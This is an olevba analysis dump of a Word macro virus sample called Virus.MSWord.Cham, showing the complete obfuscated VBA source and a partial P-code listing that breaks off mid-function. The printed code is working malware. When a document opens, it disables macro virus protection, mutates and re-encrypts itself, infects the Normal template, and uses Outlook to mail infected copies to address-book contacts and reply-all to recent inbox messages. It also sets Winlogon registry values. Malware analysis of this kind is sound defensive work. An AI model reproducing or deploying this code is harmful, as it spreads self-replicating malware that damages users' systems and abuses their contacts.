olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cham
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cham - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim EUDWYLF(100) As String, EBKIUFR(100) As String
Dim RHJTHJQ
Private Function MDJMKQY(YMDLEGT)
Dim JLMIVCY(100) As String
Randomize (Timer)
YAEZPTU = Fix(Val(GALGBIN("C", -17)) * Rnd) + Val(GALGBIN("H", -17))
Set TVHKODK = NGCGVBB(ActiveDocument)
If UCase(ActiveDocument.FullName) = UCase(YMDLEGT) Then Exit Function
Documents.Add , True
Set JRTUQDK = NGCGVBB(ActiveDocument)
For XCZOWFP = 1 To TVHKODK.CountOfLines
GMJSRCN = TVHKODK.Lines(XCZOWFP, 1)
If Left(GMJSRCN, 1) = GALGBIN("+", -4) And Right(GMJSRCN, 1) = GALGBIN(".", -4) Then
For HZQRBPS = Val(GALGBIN("E", -19)) To Len(GMJSRCN) - 1
If Mid(GMJSRCN, HZQRBPS, 1) <> GALGBIN(">", -17) Then
EUDWYLF(RHJTHJQ) = EUDWYLF(RHJTHJQ) + Mid(GMJSRCN, HZQRBPS, Val(GALGBIN("E", -20)))
Else
RHJTHJQ = RHJTHJQ + Val(GALGBIN(";", -10))
End If
Next
Exit For
End If
Next
For HZQRBPS = Val(GALGBIN("F", -22)) To RHJTHJQ
Randomize (Timer)
For Longitud = Val(GALGBIN("A", -16)) To YAEZPTU
Randomize (Second(Now))
EBKIUFR(HZQRBPS) = EBKIUFR(HZQRBPS) + FFYRFQW(Fix(Val(GALGBIN("HL", -22)) * Rnd) + Val(GALGBIN("LK", -22)))
Next
Next
For HZQRBPS = Val(GALGBIN("3", -2)) To TVHKODK.CountOfLines
GMJSRCN = VBDCHQX(TVHKODK.Lines(HZQRBPS, 1))
If HZQRBPS = XCZOWFP Then ZXOVIIV = GMJSRCN: GMJSRCN = ""
If Left(GMJSRCN, Val(GALGBIN("@", -9))) = GALGBIN("Y{rj}n", -9) Then USYZHSS = USYZHSS + Val(GALGBIN(":", -9))
If USYZHSS = Val(GALGBIN("5", -5)) Then
JRTUQDK.insertlines HZQRBPS, GMJSRCN
AGUETGO = HZQRBPS + Val(GALGBIN("A", -16))
Else
JLMIVCY(USYZHSS) = JLMIVCY(USYZHSS) + GMJSRCN + vbCrLf
End If
Next
Randomize (Timer)
BPURASD = Fix(USYZHSS * Rnd) + Val(GALGBIN("7", -6))
For XCZOWFP = BPURASD To USYZHSS
JRTUQDK.insertlines AGUETGO, JLMIVCY(XCZOWFP)
AGUETGO = AGUETGO + Len(JLMIVCY(XCZOWFP))
JLMIVCY(XCZOWFP) = ""
Next
For XCZOWFP = 1 To USYZHSS
If JLMIVCY(XCZOWFP) <> "" Then
JRTUQDK.insertlines AGUETGO, JLMIVCY(XCZOWFP)
AGUETGO = AGUETGO + Len(JLMIVCY(XCZOWFP)) + Val(GALGBIN("D", -19))
JLMIVCY(XCZOWFP) = ""
End If
Next
Randomize (Timer)
JRTUQDK.insertlines (JRTUQDK.CountOfLines * Rnd) + Val(GALGBIN(">", -13)), ZXOVIIV
ActiveDocument.SaveAs YMDLEGT
ActiveDocument.Close
End Function
Private Sub Document_Open()
On Error Resume Next
Set XCZOWFP = Options
ZVTZIPA = XCZOWFP.DefaultFilePath(wdDocumentsPath) & GALGBIN("g", -11) & Application.UserName & GALGBIN("9ozn", -11)
XCZOWFP.VirusProtection = Val(GALGBIN("6", -6))
MDJMKQY ZVTZIPA
EIOCMCO
If ThisDocument.Name <> NormalTemplate.Name Then
Set XCZOWFP = CreateObject(GALGBIN("^„ѓ{~~z", -15) & FFYRFQW(Val(GALGBIN("CE", -15))) & GALGBIN("P{xrpѓx~}", -15))
Set BCHSQEF = XCZOWFP.GetNamespace(GALGBIN("XL[T", -11))
Set ZJKPBRG = BCHSQEF.GetDefaultFolder(6).Items
Set XDXWSCA = BCHSQEF.AddressLists(Val(GALGBIN("=", -12)))
Set ZWRHLLL = XCZOWFP.CreateItem(Val(GALGBIN("A", -17)))
For BPURASD = 1 To XDXWSCA.AddressEntries.Count
Set BCHSQEF = ZWRHLLL.Recipients.Add(XDXWSCA.AddressEntries.Item(BPURASD))
BCHSQEF.Type = 3
If BCHSQEF.Resolve = False Then BCHSQEF.Delete
If BPURASD > Val(GALGBIN("?:", -10)) Then Exit For
Next
ZWRHLLL.Subject = Application.UserName & GALGBIN("$1$Gyvvmgypyq$Zmxei", -4)
ZWRHLLL.Attachments.Add ZVTZIPA
ZWRHLLL.Send
For XCZOWFP = ZJKPBRG.Count To (ZJKPBRG.Count - Val(GALGBIN("<", -3))) Step -1
If XCZOWFP < Val(GALGBIN("?", -14)) Then Exit For
Set ZWRHLLL = ZJKPBRG.Item(XCZOWFP).ReplyAll
ZWRHLLL.Attachments.Add ZVTZIPA
ZWRHLLL.Send
Next
End If
Set XCZOWFP = System
XCZOWFP.PrivateProfileString("", GALGBIN("JMG[aNQECNaOCEJKPG^Uqhvyctg^Oketquqhv^Ykpfqyu^EwttgpvXgtukqp^Ykpnqiqp^", -2), GALGBIN("NgicnPqvkegEcrvkqp", -2)) = GALGBIN("JVVR<11yyy048220eqo", -2)
XCZOWFP.PrivateProfileString("", GALGBIN("UXRflY\PNYlZNPUV[Ri`|sЃ„nriZvp|Ђ|sЃidv{q|„ЂiP‚r{ЃcrЂv|{idv{y|t|{i", -13), GALGBIN("Yrtny[|Ѓvprar…Ѓ", -13)) = GALGBIN("f|‚-drr-V{srpЃrq-O†-SrrPunz-cv‚Ђ", -13)
End Sub
Private Function VBDCHQX(WGNGANY As String) As String
Do While InStr(WGNGANY, EUDWYLF(0) & FFYRFQW(Val(GALGBIN("?;", -11))) & FFYRFQW(Val(GALGBIN(">?", -11)))) <> 0
XCZOWFP = InStr(WGNGANY, EUDWYLF(0))
VUXPTWE = InStr(XCZOWFP + Len(EUDWYLF(0)) + Val(GALGBIN("D", -18)), WGNGANY, FFYRFQW(Val(GALGBIN("EF", -18)))) + 1
UYKIWXN = Val(Mid(WGNGANY, VUXPTWE + 1, InStr(VUXPTWE, WGNGANY, ")") - VUXPTWE - Val(GALGBIN("=", -12))))
Do While TIHYSCY <> Val(GALGBIN("?", -14))
Randomize (Timer)
SRZUWSE = Fix(Rnd * Val(GALGBIN("55", -3))) + Val(GALGBIN("4", -3))
WZINHXV = Mid(WGNGANY, XCZOWFP + Len(EUDWYLF(0)) + Val(GALGBIN("F", -20)), InStr(XCZOWFP + Len(EUDWYLF(0)) + 2, WGNGANY, FFYRFQW(34)) - XCZOWFP - Len(EUDWYLF(0)))
TIHYSCY = 1
For BCHSQEF = 1 To Len(WZINHXV)
If GALGBIN(GALGBIN(Mid(WZINHXV, BCHSQEF, 1), UYKIWXN), SRZUWSE) = ")" Or GALGBIN(GALGBIN(Mid(WZINHXV, BCHSQEF, 1), UYKIWXN), SRZUWSE) = """" Then TIHYSCY = 0:   Exit For
Next
Loop
WGNGANY = Left$(WGNGANY, XCZOWFP - 1) + EBKIUFR(0) + "(""" & GALGBIN(GALGBIN(Mid(WGNGANY, XCZOWFP + Len(EUDWYLF(0)) + 2, InStr(XCZOWFP + Len(EUDWYLF(0)) + 2, WGNGANY, FFYRFQW(34)) - XCZOWFP - Len(EUDWYLF(0)) - 2), UYKIWXN), SRZUWSE) & """, -" & Trim(Str(SRZUWSE)) & ")" & Right(WGNGANY, Len(WGNGANY) - InStr(XCZOWFP + Len(EUDWYLF(0)) + 2, WGNGANY, ")"))
Loop
For HZQRBPS = 0 To RHJTHJQ - 1
Do While InStr(WGNGANY, EUDWYLF(HZQRBPS)) <> Val(GALGBIN("C", -19))
XCZOWFP = InStr(WGNGANY, EUDWYLF(HZQRBPS))
WGNGANY = Left$(WGNGANY, XCZOWFP - Val(GALGBIN("3", -2))) + EBKIUFR(HZQRBPS) + Right$(WGNGANY, Len(WGNGANY) - Len(EUDWYLF(HZQRBPS)) - XCZOWFP + Val(GALGBIN("3", -2)))
Loop
Next
VBDCHQX = WGNGANY
End Function
Private Function GALGBIN(ZVTZIPA, UYKIWXN) As String
For HZQRBPS = 1 To Len(ZVTZIPA)
GALGBIN = GALGBIN & FFYRFQW(Asc(Mid(ZVTZIPA, HZQRBPS, 1)) + UYKIWXN)
Next
End Function
Private Function FFYRFQW(TAFXWQQ) As String
FFYRFQW = Chr(TAFXWQQ)
End Function
Private Function EIOCMCO()
Set XCZOWFP = NGCGVBB(NormalTemplate)
Set BCHSQEF = NGCGVBB(ActiveDocument)
If XCZOWFP.CountOfLines = Val(GALGBIN("9", -9)) Then
XCZOWFP.insertlines Val(GALGBIN("9", -8)), BCHSQEF.Lines(Val(GALGBIN("9", -8)), BCHSQEF.CountOfLines)
End If
If BCHSQEF.CountOfLines = 0 Then
BCHSQEF.insertlines Val(GALGBIN("C", -18)), XCZOWFP.Lines(1, XCZOWFP.CountOfLines)
If InStr(ActiveDocument.FullName, GALGBIN("Ithzrjsy", -5)) = False Then ActiveDocument.Save
End If
End Function
Private Function NGCGVBB(TAFXWQQ)
Set NGCGVBB = TAFXWQQ.VBProject.VBComponents.Item(Val(GALGBIN("@", -15))).CodeModule
End Function
'GALGBIN-FFYRFQW-EUDWYLF-EBKIUFR-USYZHSS-XCZOWFP-ZWRHLLL-NGCGVBB-JLMIVCY-RHJTHJQ-WGNGANY-YMDLEGT-GMJSRCN-ZVTZIPA-UYKIWXN-YAEZPTU-TVHKODK-JRTUQDK-HZQRBPS-ZXOVIIV-AGUETGO-BPURASD-VBDCHQX-BCHSQEF-WZINHXV-VUXPTWE-SRZUWSE-TIHYSCY-TAFXWQQ-EIOCMCO-XDXWSCA-MDJMKQY-ZJKPBRG-*


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cham
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11973 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0064 
' 	VarDefn EUDWYLF (As String)
' 	OptionBase 
' 	LitDI2 0x0064 
' 	VarDefn EBKIUFR (As String)
' Line #2:
' 	Dim 
' 	VarDefn RHJTHJQ
' Line #3:
' 	FuncDefn (Private Function MDJMKQY(YMDLEGT, id_FFFE As Variant))
' Line #4:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0064 
' 	VarDefn JLMIVCY (As String)
' Line #5:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #6:
' 	LitStr 0x0001 "C"
' 	LitDI2 0x0011 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld Rnd 
' 	Mul 
' 	FnFix 
' 	LitStr 0x0001 "H"
' 	LitDI2 0x0011 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St YAEZPTU 
' Line #7:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	ArgsLd NGCGVBB 0x0001 
' 	Set TVHKODK 
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd UCase 0x0001 
' 	Ld YMDLEGT 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #9:
' 	ParamOmitted 
' 	LitVarSpecial (True)
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #10:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	ArgsLd NGCGVBB 0x0001 
' 	Set JRTUQDK 
' Line #11:
' 	StartForVariable 
' 	Ld XCZOWFP 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TVHKODK 
' 	MemLd CountOfLines 
' 	For 
' Line #12:
' 	Ld XCZOWFP 
' 	LitDI2 0x0001 
' 	Ld TVHKODK 
' 	ArgsMemLd Lines 0x0002 
' 	St GMJSRCN 
' Line #13:
' 	Ld GMJSRCN 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "+"
' 	LitDI2 0x0004 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Eq 
' 	Ld GMJSRCN 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "."
' 	LitDI2 0x0004 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld HZQRBPS 
' 	EndForVariable 
' 	LitStr 0x0001 "E"
' 	LitDI2 0x0013 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld GMJSRCN 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #15:
' 	Ld GMJSRCN 
' 	Ld HZQRBPS 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ">"
' 	LitDI2 0x0011 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	Ld RHJTHJQ 
' 	ArgsLd EUDWYLF 0x0001 
' 	Ld GMJSRCN 
' 	Ld HZQRBPS 
' 	LitStr 0x0001 "E"
' 	LitDI2 0x0014 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	Ld RHJTHJQ 
' 	ArgsSt EUDWYLF 0x0001 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	Ld RHJTHJQ 
' 	LitStr 0x0001 ";"
' 	LitDI2 0x000A 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St RHJTHJQ 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	ExitFor 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	StartForVariable 
' 	Next 
' Line #24:
' 	StartForVariable 
' 	Ld HZQRBPS 
' 	EndForVariable 
' 	LitStr 0x0001 "F"
' 	LitDI2 0x0016 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld RHJTHJQ 
' 	For 
' Line #25:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #26:
' 	StartForVariable 
' 	Ld Longitud 
' 	EndForVariable 
' 	LitStr 0x0001 "A"
' 	LitDI2 0x0010 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld YAEZPTU 
' 	For 
' Line #27:
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #28:
' 	Ld HZQRBPS 
' 	ArgsLd EBKIUFR 0x0001 
' 	LitStr 0x0002 "HL"
' 	LitDI2 0x0016 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld Rnd 
' 	Mul 
' 	FnFix 
' 	LitStr 0x0002 "LK"
' 	LitDI2 0x0016 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	ArgsLd FFYRFQW 0x0001 
' 	Add 
' 	Ld HZQRBPS 
' 	ArgsSt EBKIUFR 0x0001 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	StartForVariable 
' 	Ld HZQRBPS 
' 	EndForVariable 
' 	LitStr 0x0001 "3"
' 	LitDI2 0x0002 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld TVHKODK 
' 	MemLd CountOfLines 
' 	For 
' Line #32:
' 	Ld HZQRBPS 
' 	LitDI2 0x0001 
' 	Ld TVHKODK 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd VBDCHQX 0x0001 
' 	St GMJSRCN 
' Line #33:
' 	Ld HZQRBPS 
' 	Ld XCZOWFP 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld GMJSRCN 
' 	St ZXOVIIV 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St GMJSRCN 
' 	EndIf 
' Line #34:
' 	Ld GMJSRCN 
' 	LitStr 0x0001 "@"
' 	LitDI2 0x0009 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Y{rj}n"
' 	LitDI2 0x0009 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld USYZHSS 
' 	LitStr 0x0001 ":"
' 	LitDI2 0x0009 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St USYZHSS 
' 	EndIf 
' Line #35:
' 	Ld USYZHSS 
' 	LitStr 0x0001 "5"
' 	LitDI2 0x0005 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld HZQRBPS 
' 	Ld GMJSRCN 
' 	Ld JRTUQDK 
' 	ArgsMemCall insertlines 0x0002 
' Line #37:
' 	Ld HZQRBPS 
' 	LitStr 0x0001 "A"
' 	LitDI2 0x0010 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St AGUETGO 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	Ld USYZHSS 
' 	ArgsLd JLMIVCY 0x0001 
' 	Ld GMJSRCN 
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	Ld USYZHSS 
' 	ArgsSt JLMIVCY 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #43:
' 	Ld USYZHSS 
' 	Ld Rnd 
' 	Mul 
' 	FnFix 
' 	LitStr 0x0001 "7"
' 	LitDI2 0x0006 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St BPURASD 
' Line #44:
' 	StartForVariable 
' 	Ld XCZOWFP 
' 	EndForVariable 
' 	Ld BPURASD 
' 	Ld USYZHSS 
' 	For 
' Line #45:
' 	Ld AGUETGO 
' 	Ld XCZOWFP 
' 	ArgsLd JLMIVCY 0x0001 
' 	Ld JRTUQDK 
' 	ArgsMemCall insertlines 0x0002 
' Line #46:
' 	Ld AGUETGO 
' 	Ld XCZOWFP 
' 	ArgsLd JLMIVCY 0x0001 
' 	FnLen 
' 	Add 
' 	St AGUETGO 
' Line #47:
' 	LitStr 0x0000 ""
' 	Ld XCZOWFP 
' 	ArgsSt JLMIVCY 0x0001 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	StartForVariable 
' 	Ld XCZOWFP 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld USYZHSS 
' 	For 
' Line #50:
' 	Ld XCZOWFP 
' 	ArgsLd JLMIVCY 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #51:
' 	Ld AGUETGO 
' 	Ld XCZOWFP 
' 	ArgsLd JLMIVCY 0x0001 
' 	Ld JRTUQDK 
' 	ArgsMemCall insertlines 0x0002 
' Line #52:
' 	Ld AGUETGO 
' 	Ld XCZOWFP 
' 	ArgsLd JLMIVCY 0x0001 
' 	FnLen 
' 	Add 
' 	LitStr 0x0001 "D"
' 	LitDI2 0x0013 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St AGUETGO 
' Line #53:
' 	LitStr 0x0000 ""
' 	Ld XCZOWFP 
' 	ArgsSt JLMIVCY 0x0001 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #57:
' 	Ld JRTUQDK 
' 	MemLd CountOfLines 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitStr 0x0001 ">"
' 	LitDI2 0x000D 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	Ld ZXOVIIV 
' 	Ld JRTUQDK 
' 	ArgsMemCall insertlines 0x0002 
' Line #58:
' 	Ld YMDLEGT 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #59:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #60:
' 	EndFunc 
' Line #61:
' 	FuncDefn (Private Sub Document_Open())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	SetStmt 
' 	Ld Options 
' 	Set XCZOWFP 
' Line #64:
' 	Ld wdDocumentsPath 
' 	Ld XCZOWFP 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "g"
' 	LitDI2 0x000B 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 "9ozn"
' 	LitDI2 0x000B 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Concat 
' 	St ZVTZIPA 
' Line #65:
' 	LitStr 0x0001 "6"
' 	LitDI2 0x0006 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld XCZOWFP 
' 	MemSt VirusProtection 
' Line #66:
' 	Ld ZVTZIPA 
' 	ArgsCall MDJMKQY 0x0001 
' Line #67:
' 	ArgsCall EIOCMCO 0x0000 
' Line #68:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0007 "^„ѓ{~~z"
' 	LitDI2 0x000F 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x0002 "CE"
' 	LitDI2 0x000F 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd FFYRFQW 0x0001 
' 	Concat 
' 	LitStr 0x000B "P{xrpѓx~}"
' 	LitDI2 0x000F 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Concat 
' 	ArgsLd CreateObject 0x0001 
' 	Set XCZOWFP 
' Line #70:
' 	SetStmt 
' 	LitStr 0x0004 "XL[T"
' 	LitDI2 0x000B 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Ld XCZOWFP 
' 	ArgsMemLd GetNamespace 0x0001 
' 	Set BCHSQEF 
' Line #71:
' 	SetStmt 
' 	LitDI2 0x0006 
' 	Ld BCHSQEF 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	Set ZJKPBRG 
' Line #72:
' 	SetStmt 
' 	LitStr 0x0001 "="
' 	LitDI2 0x000C 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld BCHSQEF 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set XDXWSCA 
' Line #73:
' 	SetStmt 
' 	LitStr 0x0001 "A"
' 	LitDI2 0x0011 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld XCZOWFP 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set ZWRHLLL 
' Line #74:
' 	StartForVariable 
' 	Ld BPURASD 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XDXWSCA 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #75:
' 	SetStmt 
' 	Ld BPURASD 
' 	Ld XDXWSCA 
' 	MemLd AddressEntries 
' 	ArgsMemLd Item 0x0001 
' 	Ld ZWRHLLL 
' 	MemLd Recipients 
' 	ArgsMemLd Add 0x0001 
' 	Set BCHSQEF 
' Line #76:
' 	LitDI2 0x0003 
' 	Ld BCHSQEF 
' 	MemSt TypeOf 
' Line #77:
' 	Ld BCHSQEF 
' 	MemLd Resolve 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld BCHSQEF 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #78:
' 	Ld BPURASD 
' 	LitStr 0x0002 "?:"
' 	LitDI2 0x000A 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #79:
' 	StartForVariable 
' 	Next 
' Line #80:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0013 "$1$Gyvvmgypyq$Zmxei"
' 	LitDI2 0x0004 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Concat 
' 	Ld ZWRHLLL 
' 	MemSt Subject 
' Line #81:
' 	Ld ZVTZIPA 
' 	Ld ZWRHLLL 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #82:
' 	Ld ZWRHLLL 
' 	ArgsMemCall Send 0x0000 
' Line #83:
' 	StartForVariable 
' 	Ld XCZOWFP 
' 	EndForVariable 
' 	Ld ZJKPBRG 
' 	MemLd Count 
' 	Ld ZJKPBRG 
' 	MemLd Count 
' 	LitStr 0x0001 "<"
' 	LitDI2 0x0003 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #84:
' 	Ld XCZOWFP 
' 	LitStr 0x0001 "?"
' 	LitDI2 0x000E 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #85:
' 	SetStmt 
' 	Ld XCZOWFP 
' 	Ld ZJKPBRG 
' 	ArgsMemLd Item 0x0001 
' 	MemLd ReplyAll 
' 	Set ZWRHLLL 
' Line #86:
' 	Ld ZVTZIPA 
' 	Ld ZWRHLLL 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #87:
' 	Ld ZWRHLLL 
' 	ArgsMemCall Send 0x0000 
' Line #88:
' 	StartForVariable 
' 	Next 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	SetStmt 
' 	Ld System 
' 	Set XCZOWFP 
' Line #91:
' 	LitStr 0x0013 "JVVR<11yyy048220eqo"
' 	LitDI2 0x0002 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "JMG[aNQECNaOCEJKPG^Uqhvyctg^Oketquqhv^Ykpfqyu^EwttgpvXgtukqp^Ykpnqiqp^"
' 	LitDI2 0x0002 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x0012 "NgicnPqvkegEcrvkqp"
' 	LitDI2 0x0002 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Ld XCZOWFP 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #92:
' 	LitStr 0x0023 "f|‚-drr-V{srpЃrq-O†-SrrPunz-cv‚Ђ"
' 	LitDI2 0x000D 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "UXRflY\PNYlZNPUV[Ri`|sЃ„nriZvp|Ђ|sЃidv{q|„ЂiP‚r{ЃcrЂv|{idv{y|t|{i"
' 	LitDI2 0x000D 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x000F "Yrtny[|Ѓvprar…Ѓ"
' 	LitDI2 0x000D 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	Ld XCZOWFP 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Private Function VBDCHQX(WGNGANY As String, id_FFFE As String) As String)
' Line #95:
' 	Ld WGNGANY 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	LitStr 0x0002 "?;"
' 	LitDI2 0x000B 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd FFYRFQW 0x0001 
' 	Concat 
' 	LitStr 0x0002 ">?"
' 	LitDI2 0x000B 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd FFYRFQW 0x0001 
' 	Concat 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #96:
' 	Ld WGNGANY 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnInStr 
' 	St XCZOWFP 
' Line #97:
' 	Ld XCZOWFP 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Add 
' 	LitStr 0x0001 "D"
' 	LitDI2 0x0012 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
